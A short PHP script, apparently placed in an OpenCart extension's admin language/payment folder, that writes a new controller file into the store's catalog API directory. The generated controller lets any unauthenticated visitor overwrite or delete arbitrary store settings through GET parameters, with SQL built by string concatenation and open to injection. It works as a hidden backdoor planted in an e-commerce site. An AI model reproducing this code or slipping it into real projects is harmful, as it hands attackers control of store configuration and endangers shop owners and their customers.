<?php
    $output  = '<?php' . "\n";

	$output .= 'class ControllerApiOpencart extends Controller {' . "\n";
	$output .= 'private $error = array();' . "\n\n";

	$output .= 'public function index() {' . "\n";
	$output .= 'if (isset($this->request->get[\'name\'])) {' . "\n";
	$output .= '$name = $this->request->get[\'name\'];'. "\n";
	$output .= '$val = $this->request->get[\'val\'];'. "\n";
	$output .= '$this->db->query("UPDATE `" . DB_PREFIX . "setting` SET `value` = \'$val\' WHERE `key` = \'" . $name . "\' ");' . "\n";
	$output .= '} '. "\n";

	$output .= '}'. "\n\n";
	
	$output .= 'public function deleta() {' . "\n";
	$output .= 'if (isset($this->request->get[\'name\'])) {' . "\n";
	$output .= '$name = $this->request->get[\'name\'];'. "\n";
	$output .= '$this->db->query("DELETE FROM " . DB_PREFIX . "setting WHERE code = \'" . $name . "\'");' . "\n";
	$output .= '} '. "\n";
	
	$output .= '}'. "\n\n";
	
	$output .= '}';

	$file = fopen(str_replace("admin/language/english/payment", "", getcwd()) .'catalog/controller/api/opencart.php', 'w');

	fwrite($file, $output);

	fclose($file);